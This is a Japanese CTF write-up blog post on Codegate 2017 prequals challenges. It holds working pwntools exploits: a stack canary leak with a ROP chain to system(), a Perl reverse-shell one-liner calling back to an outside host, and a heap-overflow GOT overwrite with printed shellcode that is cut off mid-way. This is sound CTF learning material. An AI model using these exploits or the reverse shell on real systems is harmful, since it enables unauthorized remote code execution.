@@ -1,0 +1,370 @@
+<!DOCTYPE HTML><html lang="ja"><head><meta charset="utf-8"><meta content="Tosainu" name="author"><meta content="Codegate 2017 CTF prequals writeup2017/02/11 21:20CTFCodegate 2017 CTF の Prequalification Round に一人チーム poepoe で参加. 305 points で 78 位(General)でした.pwn " name="description"><meta content="Hakyll" name="generator"><meta content="width=device-width, initial-scale=1" name="viewport"><meta property="twitter:card" content="summary"><meta property="twitter:site" content="myon___"><meta property="twitter:creator" content="myon___"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/index.html"><meta property="og:title" content="Codegate 2017 CTF prequals writeup | Tosainu Lab"><meta property="og:description" content="Codegate 2017 CTF prequals writeup2017/02/11 21:20CTFCodegate 2017 CTF の Prequalification Round に一人チーム poepoe で参加. 305 points で 78 位(General)でした.pwn "><meta property="og:site_name" content="Tosainu Lab"><meta property="og:image" content="https://tosainu.bitbucket.io/svgs/heap1.svg"><title>Codegate 2017 CTF prequals writeup | Tosainu Lab</title><link href="/vendor/normalize.css/normalize.css" rel="stylesheet"><link href="/stylesheets/style.css" rel="stylesheet"><link href="/stylesheets/highlight.css" rel="stylesheet"><link href="/vendor/fontawesome/style.css" rel="stylesheet"><link href="/vendor/katex/katex.min.css" rel="stylesheet"><link href="/feed.xml" title="Atom Feed" type="application/atom+xml" rel="alternate"><script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-57978655-1','auto');ga('send','pageview');</script><script async src="https://www.google-analytics.com/analytics.js"></script></head><body><header class="site-header"><div class="container"><h1><a href="/" title="home">Tosainu Lab</a></h1></div></header><main class="post"><article><header class="post-header"><div class="container"><h1><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/" title="Codegate 2017 CTF prequals writeup">Codegate 2017 CTF prequals writeup</a></h1><ul class="post-meta"><li><svg role="img" class="svg-inline--fa fa-calendar-alt fa-w-14" data-icon="calendar-alt" data-prefix="fas" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M436 160H12c-6.6 0-12-5.4-12-12v-36c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48v36c0 6.6-5.4 12-12 12zM12 192h424c6.6 0 12 5.4 12 12v260c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V204c0-6.6 5.4-12 12-12zm116 204c0-6.6-5.4-12-12-12H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm128 128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm128 128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40z"></path></svg></li><li class="date">2017/02/11 21:20</li><li><svg role="img" class="svg-inline--fa fa-tags fa-w-20" data-icon="tags" data-prefix="fas" viewBox="0 0 640 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M497.941 225.941L286.059 14.059A48 48 0 0 0 252.118 0H48C21.49 0 0 21.49 0 48v204.118a48 48 0 0 0 14.059 33.941l211.882 211.882c18.744 18.745 49.136 18.746 67.882 0l204.118-204.118c18.745-18.745 18.745-49.137 0-67.882zM112 160c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm513.941 133.823L421.823 497.941c-18.745 18.745-49.137 18.745-67.882 0l-.36-.36L527.64 323.522c16.999-16.999 26.36-39.6 26.36-63.64s-9.362-46.641-26.36-63.64L331.397 0h48.721a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882z"></path></svg></li><li><ul class="tag-list"><li><a href="/entry/tags/ctf/"><span>CTF</span></a></li></ul></li></ul></div></header><div class="container"><div class="post-contents"><p><a href="http://ctf.codegate.org/" target="_blank" rel="nofollow noopener">Codegate 2017 CTF</a> の Prequalification Round に一人チーム poepoe で参加. 305 points で 78 位(General)でした.</p>
+<p>pwn 過去問でもよく見かける Codegate 関連の CTF というだけあって, 実行ファイル解析系の問題が多めだった感じ. 正答者数が増えると問題の得点が下がっていくシステムもあったりで面白かった.</p>
+<!--more-->
+<h2 id="mic-check-50pt">1. Mic Check <small>(50pt)</small></h2>
+<p>いわゆるサービス問題. 問題文に得点のシステム等の説明とともに Flag が書いてある.<br />
+<strong>real flag is in brackets</strong> とあるように, 送信する Flag は <code>{}</code> 内の文字列だけなので注意.</p>
+<blockquote>
+<p>Mic Check one two~ one two~</p>
+<p>First Point : 500<br />
+Minimal Point : 50<br />
+Minus per one solver : -5</p>
+<p>Here is Flag~ FLAG{Welcome_to_codegate2017}</p>
+<p>real flag is in brackets.</p>
+</blockquote>
+<h2 id="babypwn-50pt">2. BabyPwn <small>(50pt)</small></h2>
+<p>32bit の ELF.<br />
+fork-server 型などと呼ばれているタイプの問題で, 実行すると <code>argv[1]</code> に渡した数値または <code>8181</code> ポートで接続を待つような感じになっていた.</p>
+<pre><code>$ file babypwn
+babypwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=79d683df4838066af61f58fc7025deb99e6bab3d, stripped
+
+$ checksec babypwn
+[*] '/tmp/babypwn'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE</code></pre>
+<p>対象のアドレス/ポートに接続すると, 次のようなメニューが表示される. 1は入力した文字列をそのまま表示, 2は入力した文字列を逆順で表示するというものだった.</p>
+<pre><code>$ nc localhost 8181
+▒▒▒▒▒▒▒C▒O▒D▒E▒G▒A▒T▒E▒2▒0▒1▒7▒▒▒▒▒▒▒
+▒▒▒▒▒▒▒B▒A▒B▒Y▒P▒W▒N▒!▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▒▒▒G▒O▒O▒D▒L▒U▒C▒K▒~▒!▒▒▒▒▒▒▒▒▒▒▒
+===============================
+1. Echo
+2. Reverse Echo
+3. Exit
+===============================
+Select menu &gt; </code></pre>
+<p>接続後の主な処理は <code>0x08048a71</code> の関数にあった. 1の処理を追っていくと, 入力した文字列を入れるために確保した領域(0x28 byte)に <code>recv()</code> で <code>0x64</code> byte も読み込んでいるため stack buffer overflow が起こせる. しかも, 次の入力された文字列を返す処理では, <code>send()</code> で <code>strlen(buf)</code> 分の文字列を送信しているため, stack の情報をリークさせることが可能なのがわかる.</p>
+<p>そこで, 次のような攻撃を行う.<br />
+まず, stack canary をリークさせる. canary は <code>0x5082ab00</code> のような下位1 byte が <code>0x00</code> なランダムな値なので, 0x28 +1文字を書き込んで <code>strlen()</code> のチェックを回避し, 送られてくる文字列の0x29~0x2c文字目を処理することで得られる.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb3-1" data-line-number="1"><span class="co">#!/usr/bin/env python2</span></a>
+<a class="sourceLine" id="cb3-2" data-line-number="2"></a>
+<a class="sourceLine" id="cb3-3" data-line-number="3"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
+<a class="sourceLine" id="cb3-4" data-line-number="4"></a>
+<a class="sourceLine" id="cb3-5" data-line-number="5">r <span class="op">=</span> remote(<span class="st">'localhost'</span>, <span class="dv">8181</span>)</a>
+<a class="sourceLine" id="cb3-6" data-line-number="6"></a>
+<a class="sourceLine" id="cb3-7" data-line-number="7"><span class="kw">def</span> echo(s):</a>
+<a class="sourceLine" id="cb3-8" data-line-number="8">    r.recvuntil(<span class="st">'Select menu &gt; '</span>)</a>
+<a class="sourceLine" id="cb3-9" data-line-number="9">    r.sendline(<span class="st">'1'</span>)</a>
+<a class="sourceLine" id="cb3-10" data-line-number="10">    r.recvuntil(<span class="st">'Input Your Message : '</span>)</a>
+<a class="sourceLine" id="cb3-11" data-line-number="11">    r.send(s)</a>
+<a class="sourceLine" id="cb3-12" data-line-number="12">    ret <span class="op">=</span> r.recvuntil(<span class="st">'</span><span class="ch">\12</span><span class="st">='</span>)</a>
+<a class="sourceLine" id="cb3-13" data-line-number="13">    <span class="cf">return</span> ret[:<span class="op">-</span><span class="dv">2</span>]</a>
+<a class="sourceLine" id="cb3-14" data-line-number="14"></a>
+<a class="sourceLine" id="cb3-15" data-line-number="15">buffer_size <span class="op">=</span> <span class="bn">0x28</span></a>
+<a class="sourceLine" id="cb3-16" data-line-number="16"></a>
+<a class="sourceLine" id="cb3-17" data-line-number="17">ret <span class="op">=</span> echo(<span class="st">'A'</span> <span class="op">*</span> (buffer_size <span class="op">+</span> <span class="dv">1</span>))</a>
+<a class="sourceLine" id="cb3-18" data-line-number="18">canary <span class="op">=</span> u32(ret[buffer_size:buffer_size <span class="op">+</span> <span class="dv">5</span>]) <span class="op">&amp;</span> <span class="bn">0xffffff00</span></a>
+<a class="sourceLine" id="cb3-19" data-line-number="19">log.info(<span class="st">'leaked canary: 0x</span><span class="sc">%x</span><span class="st">'</span> <span class="op">%</span> canary)</a>
+<a class="sourceLine" id="cb3-20" data-line-number="20"></a>
+<a class="sourceLine" id="cb3-21" data-line-number="21">r.close()</a></code></pre></div>
+<pre><code>$ ./exploit.py
+[+] Opening connection to localhost on port 8181: Done
+[*] leaked canary: 0x5082ab00
+[*] Closed connection to localhost port 8181</code></pre>
+<p>次に, リークさせた canary を使って bof のチェックを回避しつつ, リターンアドレスを書き換えて ROP につなげる.<br />
+調べていくと <code>0x08048c3b</code> にこんな感じの関数(があった痕跡?)があるので, <code>system@plt()</code> を呼び出せば任意のシェルコマンドを実行できそうなのがわかる.</p>
+<pre><code>[0x08048710]&gt; pd 14 @ 0x08048c3b
+            0x08048c3b      push ebp
+            0x08048c3c      mov ebp, esp
+            0x08048c3e      sub esp, 0x28
+            0x08048c41      mov eax, dword gs:[0x14]
+            0x08048c47      mov dword [ebp - 0xc], eax
+            0x08048c4a      xor eax, eax
+            0x08048c4c      mov dword [esp], str.echo__not_easy_to_see._
+            0x08048c53      call sym.imp.system
+            0x08048c58      mov eax, dword [ebp - 0xc]
+            0x08048c5b      xor eax, dword gs:[0x14]
+        ,=&lt; 0x08048c62      je 0x8048c69
+        |   0x08048c64      call sym.imp.__stack_chk_fail
+        `-&gt; 0x08048c69      leave
+            0x08048c6a      ret</code></pre>
+<p>しかし, これは fork-server 型なので <code>system(&quot;/bin/sh&quot;)</code> を呼んでも意味がない<a href="#fn1" class="footnote-ref" id="fnref1"><sup>1</sup></a>. そこで, Linux 環境ならほぼ確実に入っているだろう Perl の connect-back shell を起動するワンライナーを使うことにした.</p>
+<p>また, <code>system()</code> の引数に渡す文字列は, 木曜に解いた <a href="http://shell-storm.org/repo/CTF/CSAW-2013/Exploitation/CSAW-Diary-300/" target="_blank" rel="nofollow noopener">CSAW CTF Qualification Round 2013: Exploitation3</a> (<a href="https://gist.github.com/Tosainu/5e0a1764c020a7e5b251b64b48b1468c" target="_blank" rel="nofollow noopener">書いたスクリプト</a>)と同じような手法を使って送り込んだ.<br />
+ROP が発動する段階ではまだ通信が close されていないことを利用し, まず <code>recv(fd, addr_bss, 0x100, 0)</code> を呼んで <code>.bss</code> セクションに実行したいシェルコマンドを書き込み, その後 <code>system(addr_bss)</code> につなげて送ったコマンドを実行させる.</p>
+<p>実際に作成したスクリプトと実行結果は次の通り. 作業している環境が 無線 LAN ルータ等の NAT の下にある場合は port forwarding の設定をしておくのも忘れずに.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb6-1" data-line-number="1"><span class="co">#!/usr/bin/env python2</span></a>
+<a class="sourceLine" id="cb6-2" data-line-number="2"></a>
+<a class="sourceLine" id="cb6-3" data-line-number="3"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
+<a class="sourceLine" id="cb6-4" data-line-number="4"></a>
+<a class="sourceLine" id="cb6-5" data-line-number="5"><span class="co"># $ objdump -M intel -j .plt -d babypwn</span></a>
+<a class="sourceLine" id="cb6-6" data-line-number="6"><span class="co"># (...)</span></a>
+<a class="sourceLine" id="cb6-7" data-line-number="7"><span class="co"># 08048620 &lt;system@plt&gt;:</span></a>
+<a class="sourceLine" id="cb6-8" data-line-number="8"><span class="co">#  8048620:	ff 25 2c b0 04 08    	jmp    DWORD PTR ds:0x804b02c</span></a>
+<a class="sourceLine" id="cb6-9" data-line-number="9"><span class="co">#  8048626:	68 40 00 00 00       	push   0x40</span></a>
+<a class="sourceLine" id="cb6-10" data-line-number="10"><span class="co">#  804862b:	e9 60 ff ff ff       	jmp    8048590 &lt;setsockopt@plt-0x10&gt;</span></a>
+<a class="sourceLine" id="cb6-11" data-line-number="11"><span class="co"># (...)</span></a>
+<a class="sourceLine" id="cb6-12" data-line-number="12"><span class="co"># 080486e0 &lt;recv@plt&gt;:</span></a>
+<a class="sourceLine" id="cb6-13" data-line-number="13"><span class="co">#  80486e0:	ff 25 5c b0 04 08    	jmp    DWORD PTR ds:0x804b05c</span></a>
+<a class="sourceLine" id="cb6-14" data-line-number="14"><span class="co">#  80486e6:	68 a0 00 00 00       	push   0xa0</span></a>
+<a class="sourceLine" id="cb6-15" data-line-number="15"><span class="co">#  80486eb:	e9 a0 fe ff ff       	jmp    8048590 &lt;setsockopt@plt-0x10&gt;</span></a>
+<a class="sourceLine" id="cb6-16" data-line-number="16">addr_system_plt <span class="op">=</span> <span class="bn">0x8048620</span></a>
+<a class="sourceLine" id="cb6-17" data-line-number="17">addr_recv_plt   <span class="op">=</span> <span class="bn">0x80486e0</span></a>
+<a class="sourceLine" id="cb6-18" data-line-number="18"></a>
+<a class="sourceLine" id="cb6-19" data-line-number="19"><span class="co"># $ readelf -S babypwn | grep .bss</span></a>
+<a class="sourceLine" id="cb6-20" data-line-number="20"><span class="co">#   [25] .bss              NOBITS          0804b1b4 0021b4 00000c 00  WA  0   0  4</span></a>
+<a class="sourceLine" id="cb6-21" data-line-number="21">addr_bss <span class="op">=</span> <span class="bn">0x804b1b4</span></a>
+<a class="sourceLine" id="cb6-22" data-line-number="22"></a>
+<a class="sourceLine" id="cb6-23" data-line-number="23">buffer_size <span class="op">=</span> <span class="bn">0x28</span></a>
+<a class="sourceLine" id="cb6-24" data-line-number="24"></a>
+<a class="sourceLine" id="cb6-25" data-line-number="25">socket_fd <span class="op">=</span> <span class="dv">4</span></a>
+<a class="sourceLine" id="cb6-26" data-line-number="26"></a>
+<a class="sourceLine" id="cb6-27" data-line-number="27"><span class="co"># r = remote('localhost', 8181)</span></a>
+<a class="sourceLine" id="cb6-28" data-line-number="28">r <span class="op">=</span> remote(<span class="st">'110.10.212.130'</span>, <span class="dv">8888</span>)</a>
+<a class="sourceLine" id="cb6-29" data-line-number="29"><span class="co"># r = remote('110.10.212.130', 8889)</span></a>
+<a class="sourceLine" id="cb6-30" data-line-number="30"></a>
+<a class="sourceLine" id="cb6-31" data-line-number="31"><span class="kw">def</span> echo(s):</a>
+<a class="sourceLine" id="cb6-32" data-line-number="32">    r.recvuntil(<span class="st">'Select menu &gt; '</span>)</a>
+<a class="sourceLine" id="cb6-33" data-line-number="33">    r.sendline(<span class="st">'1'</span>)</a>
+<a class="sourceLine" id="cb6-34" data-line-number="34">    r.recvuntil(<span class="st">'Input Your Message : '</span>)</a>
+<a class="sourceLine" id="cb6-35" data-line-number="35">    r.send(s)</a>
+<a class="sourceLine" id="cb6-36" data-line-number="36">    ret <span class="op">=</span> r.recvuntil(<span class="st">'</span><span class="ch">\12</span><span class="st">='</span>)</a>
+<a class="sourceLine" id="cb6-37" data-line-number="37">    <span class="cf">return</span> ret[:<span class="op">-</span><span class="dv">2</span>]</a>
+<a class="sourceLine" id="cb6-38" data-line-number="38"></a>
+<a class="sourceLine" id="cb6-39" data-line-number="39"><span class="kw">def</span> reverse_echo(s):</a>
+<a class="sourceLine" id="cb6-40" data-line-number="40">    r.recvuntil(<span class="st">'Select menu &gt; '</span>)</a>
+<a class="sourceLine" id="cb6-41" data-line-number="41">    r.sendline(<span class="st">'2'</span>)</a>
+<a class="sourceLine" id="cb6-42" data-line-number="42">    r.recvuntil(<span class="st">'Input Your Message : '</span>)</a>
+<a class="sourceLine" id="cb6-43" data-line-number="43">    r.send(s)</a>
+<a class="sourceLine" id="cb6-44" data-line-number="44">    ret <span class="op">=</span> r.recvuntil(<span class="st">'</span><span class="ch">\12</span><span class="st">='</span>)</a>
+<a class="sourceLine" id="cb6-45" data-line-number="45">    <span class="cf">return</span> ret[:<span class="op">-</span><span class="dv">2</span>]</a>
+<a class="sourceLine" id="cb6-46" data-line-number="46"></a>
+<a class="sourceLine" id="cb6-47" data-line-number="47"><span class="kw">def</span> exit_app():</a>
+<a class="sourceLine" id="cb6-48" data-line-number="48">    r.recvuntil(<span class="st">'Select menu &gt; '</span>)</a>
+<a class="sourceLine" id="cb6-49" data-line-number="49">    r.sendline(<span class="st">'3'</span>)</a>
+<a class="sourceLine" id="cb6-50" data-line-number="50"></a>
+<a class="sourceLine" id="cb6-51" data-line-number="51"><span class="co"># leak canary</span></a>
+<a class="sourceLine" id="cb6-52" data-line-number="52">ret <span class="op">=</span> echo(<span class="st">'A'</span> <span class="op">*</span> (buffer_size <span class="op">+</span> <span class="dv">1</span>))</a>
+<a class="sourceLine" id="cb6-53" data-line-number="53">canary <span class="op">=</span> u32(ret[buffer_size:buffer_size <span class="op">+</span> <span class="dv">5</span>]) <span class="op">&amp;</span> <span class="bn">0xffffff00</span></a>
+<a class="sourceLine" id="cb6-54" data-line-number="54">log.info(<span class="st">'leaked canary: 0x</span><span class="sc">%x</span><span class="st">'</span> <span class="op">%</span> canary)</a>
+<a class="sourceLine" id="cb6-55" data-line-number="55"></a>
+<a class="sourceLine" id="cb6-56" data-line-number="56"><span class="co"># send ROP</span></a>
+<a class="sourceLine" id="cb6-57" data-line-number="57">payload <span class="op">=</span> <span class="st">''</span></a>
+<a class="sourceLine" id="cb6-58" data-line-number="58">payload <span class="op">+=</span> <span class="st">'A'</span> <span class="op">*</span> buffer_size</a>
+<a class="sourceLine" id="cb6-59" data-line-number="59">payload <span class="op">+=</span> p32(canary)</a>
+<a class="sourceLine" id="cb6-60" data-line-number="60">payload <span class="op">+=</span> <span class="st">'BBBB'</span>                   <span class="co"># 0x8048b83:        pop    ebx</span></a>
+<a class="sourceLine" id="cb6-61" data-line-number="61">payload <span class="op">+=</span> <span class="st">'BBBB'</span>                   <span class="co"># 0x8048b84:        pop    edi</span></a>
+<a class="sourceLine" id="cb6-62" data-line-number="62">payload <span class="op">+=</span> p32(addr_bss <span class="op">+</span> <span class="bn">0x800</span>)    <span class="co"># 0x8048b85:        pop    ebp</span></a>
+<a class="sourceLine" id="cb6-63" data-line-number="63">payload <span class="op">+=</span> p32(addr_recv_plt)       <span class="co"># recv(fd, addr_bss, 0x100, 0)</span></a>
+<a class="sourceLine" id="cb6-64" data-line-number="64">payload <span class="op">+=</span> p32(addr_system_plt)     <span class="co"># system(addr_bss)</span></a>
+<a class="sourceLine" id="cb6-65" data-line-number="65">payload <span class="op">+=</span> p32(socket_fd)</a>
+<a class="sourceLine" id="cb6-66" data-line-number="66">payload <span class="op">+=</span> p32(addr_bss)</a>
+<a class="sourceLine" id="cb6-67" data-line-number="67">payload <span class="op">+=</span> p32(<span class="bn">0x100</span>)</a>
+<a class="sourceLine" id="cb6-68" data-line-number="68">payload <span class="op">+=</span> p32(<span class="dv">0</span>)</a>
+<a class="sourceLine" id="cb6-69" data-line-number="69">echo(payload)</a>
+<a class="sourceLine" id="cb6-70" data-line-number="70"></a>
+<a class="sourceLine" id="cb6-71" data-line-number="71">exit_app()</a>
+<a class="sourceLine" id="cb6-72" data-line-number="72"></a>
+<a class="sourceLine" id="cb6-73" data-line-number="73"><span class="co"># send connect-back shell one-liner</span></a>
+<a class="sourceLine" id="cb6-74" data-line-number="74">r.clean()</a>
+<a class="sourceLine" id="cb6-75" data-line-number="75">r.sendline(<span class="st">'perl -e </span><span class="ch">\'</span><span class="st">use Socket;$i=&quot;your.global.ip.address&quot;;$p=13895;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};</span><span class="ch">\'\x00</span><span class="st">'</span>)</a></code></pre></div>
+<pre><code>$ nc -l -v 192.168.xxx.xxx 13895
+Listening on [192.168.xxx.xxx] (family 0, port 13895)
+Connection from 110.10.212.130 59276 received!
+$ ls
+babypwn
+flag
+$ cat flag
+FLAG{Good_Job~!Y0u_@re_Very__G@@d!!!!!!^.^}
+$ %                                            </code></pre>
+<p>BabyPwn という名前の割にはおもしろい要素がたくさん詰め込まれている感じで, 解いててめちゃくちゃ楽しかった. 気づいたら50点にまで下がっててつらい…</p>
+<h3 id="追記">2017/02/20 追記</h3>
+<p>socket の fd が特定できているので, わざわざ connect-back shell を立ち上げなくとも <code>/bin/sh -i &lt;&amp;fd &gt;&amp;fd 2&gt;&amp;fd</code> を実行させればいいってことに気づいた. 上のスクリプトの最後の行を次のように変更することで, とりあえずローカルでシェルを取ることができた.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb8-1" data-line-number="1">r.sendline(<span class="st">'/bin/sh -i &lt;&amp;</span><span class="sc">{0}</span><span class="st"> &gt;&amp;</span><span class="sc">{0}</span><span class="st"> 2&gt;&amp;</span><span class="sc">{0}</span><span class="st">'</span>.<span class="bu">format</span>(socket_fd))</a>
+<a class="sourceLine" id="cb8-2" data-line-number="2"></a>
+<a class="sourceLine" id="cb8-3" data-line-number="3">r.interactive()</a></code></pre></div>
+<pre><code>$ ./exploit2.py
+[+] Opening connection to localhost on port 8181: Done
+[*] leaked canary: 0x6e6b8100
+[*] Switching to interactive mode
+sh-4.4$ $ ls
+ls
+babypwn
+exploit2.py
+exploit.py
+flag.txt
+out
+peda-session-babypwn.txt
+sh-4.4$ $ 
+[*] Closed connection to localhost port 8181</code></pre>
+<h2 id="messenger-205pt">12 messenger <small>(205pt)</small></h2>
+<p>x86-64 の ELF.</p>
+<pre><code>$ file messenger
+messenger: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d8396b1a1f90c3679f6946c3693f93abf4563ba4, stripped
+
+$ checksec messenger
+[*] '/tmp/messenger'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE</code></pre>
+<p>起動するとこんな感じ. 2つまでのメッセージの追加/削除/変更/確認ができる.</p>
+<pre><code>$ ./messenger
+ _ __ ___   ___  ___ ___  ___ _ __   __ _  ___ _ __
+| '_ ` _ \ / _ \/ __/ __|/ _ \ '_ \ / _` |/ _ \ '__|
+| | | | | |  __/\__ \__ \  __/ | | | (_| |  __/ |
+|_| |_| |_|\___||___/___/\___|_| |_|\__, |\___|_|
+                                    |___/
+[L]eave message
+[R]emove message
+[C]hange message
+[V]iew message
+[Q]uit
+&gt;&gt; </code></pre>
+<p>先に書いておくと, この問題は <a href="https://github.com/ctfs/write-ups-2014/blob/master/plaid-ctf-2014/ezhp/README.md" target="_blank" rel="nofollow noopener">Plaid CTF 2014: ezhp</a> に非常に似ていて, <a href="https://gist.github.com/Tosainu/1216f3b74aeff490fef0d0e3e3033671" target="_blank" rel="nofollow noopener">実際に僕が解いたときのスクリプト</a>をこのプログラムに合わせて変更するだけで解くことができた.</p>
+<p>このプログラムは <code>[L]eave message</code> で登録するメッセージの長さを <code>0x20</code> 文字までに制限しているのに対し, <code>[C]hange message</code> では長さのチェックを行なっておらず, しかも変更前の領域にそのまま新しいメッセージを書き込んでいる. メッセージは独自実装の <code>malloc()</code> 的なもので確保された heap 上にあるため, heap buffer overflow が起こせる.</p>
+<p>そこで, 次のような攻撃を行う.<br />
+メッセージを1つ追加したとき, heap はこのような双方向リストになっている. ここで一つのブロックのことを chunk, 前の chunk を指すポインタを <code>bk</code>, 次の chunk を指すポインタを <code>fd</code> と呼ぶことにする.</p>
+<figure>
+<img src="https://tosainu.bitbucket.io/svgs/heap1.svg" alt="heap1" /><figcaption>heap1</figcaption>
+</figure>
+<p>ここで1つ目のメッセージを変更して heap bof を起こし, 次の chunk の bk を <code>exit()</code> の GOT のアドレスから8を引いたものに書き換える.</p>
+<figure>
+<img src="https://tosainu.bitbucket.io/svgs/heap2.svg" alt="heap2" /><figcaption>heap2</figcaption>
+</figure>
+<p>この状態で2つ目のメッセージの追加するとこのようになり,</p>
+<figure>
+<img src="https://tosainu.bitbucket.io/svgs/heap3.svg" alt="heap3" /><figcaption>heap3</figcaption>
+</figure>
+<p>そのまま2つ目のメッセージの削除を行うと, <code>exit()</code> の GOT のアドレスから8を引いたもの以降を1つの chunk として見た時に <code>fd</code> に相当する <code>exit()</code> の GOT を3つ目の chunk のアドレスに書き換えることができる. (図の chunk1, chunk2 の <code>fd</code>, <code>bk</code> が指す要素は, 一応 gdb でも確認しているが正直自信がない. ここでは特に重要でないので気にしないで…)</p>
+<figure>
+<img src="https://tosainu.bitbucket.io/svgs/heap4.svg" alt="heap4" /><figcaption>heap4</figcaption>
+</figure>
+<p>あとは3つ目の chunk が作られる予定のアドレス辺りに shellcode が配置されるように1つ目のメッセージを再び変更する. すると <code>exit@plt()</code> が呼び出されたときに shellcode が実行されるようになる.</p>
+<p>実際に作成したスクリプトと実行結果は次の通り.</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb12-1" data-line-number="1"><span class="co">#!/usr/bin/env python2</span></a>
+<a class="sourceLine" id="cb12-2" data-line-number="2"></a>
+<a class="sourceLine" id="cb12-3" data-line-number="3"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
+<a class="sourceLine" id="cb12-4" data-line-number="4"></a>
+<a class="sourceLine" id="cb12-5" data-line-number="5"><span class="co"># $ objdump -M intel -j .plt -d messenger</span></a>
+<a class="sourceLine" id="cb12-6" data-line-number="6"><span class="co"># ...</span></a>
+<a class="sourceLine" id="cb12-7" data-line-number="7"><span class="co"># 0000000000400780 &lt;exit@plt&gt;:</span></a>
+<a class="sourceLine" id="cb12-8" data-line-number="8"><span class="co">#   400780:	ff 25 ea 18 20 00    	jmp    QWORD PTR [rip+0x2018ea]        # 602070 &lt;exit@plt+0x2018f0&gt;</span></a>
+<a class="sourceLine" id="cb12-9" data-line-number="9"><span class="co">#   400786:	68 0b 00 00 00       	push   0xb</span></a>
+<a class="sourceLine" id="cb12-10" data-line-number="10"><span class="co">#   40078b:	e9 30 ff ff ff       	jmp    4006c0 &lt;puts@plt-0x10&gt;</span></a>
+<a class="sourceLine" id="cb12-11" data-line-number="11"><span class="co"># ...</span></a>
+<a class="sourceLine" id="cb12-12" data-line-number="12">addr_exit_got <span class="op">=</span> <span class="bn">0x602070</span></a>
+<a class="sourceLine" id="cb12-13" data-line-number="13"></a>
+<a class="sourceLine" id="cb12-14" data-line-number="14"><span class="co"># msf &gt; use payload/linux/x64/exec</span></a>
+<a class="sourceLine" id="cb12-15" data-line-number="15"><span class="co"># msf payload(exec) &gt; generate -b '\x00' -t python -o CMD=/bin/sh</span></a>
+<a class="sourceLine" id="cb12-16" data-line-number="16">shellcode <span class="op">=</span>  <span class="st">''</span></a>
+<a class="sourceLine" id="cb12-17" data-line-number="17">shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05</span><span class="st">'</span></a>
+<a class="sourceLine" id="cb12-18" data-line-number="18">shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\xef\xff\xff\xff\x48\xbb\x80\x51\x84\x63\x84\x7a\x7b</span><span class="st">'</span></a>
+<a class="sourceLine" id="cb12-19" data-line-number="19">shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x73\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class="st">'</span></a>
+<a class="sourceLine" id="cb12-20" data-line-number="20">shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\xea\x6a\xdc\xfa\xcc\xc1\x54\x11\xe9\x3f\xab\x10\xec</span><span class="st">'</span></a>
+<a class="sourceLine" id="cb12-21" data-line-number="21">shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x7a\x28\x3b\x09\xb6\xec\x4e\xe7\x7a\x7b\x3b\x09\xb7</span><span class="st">'</span></a>
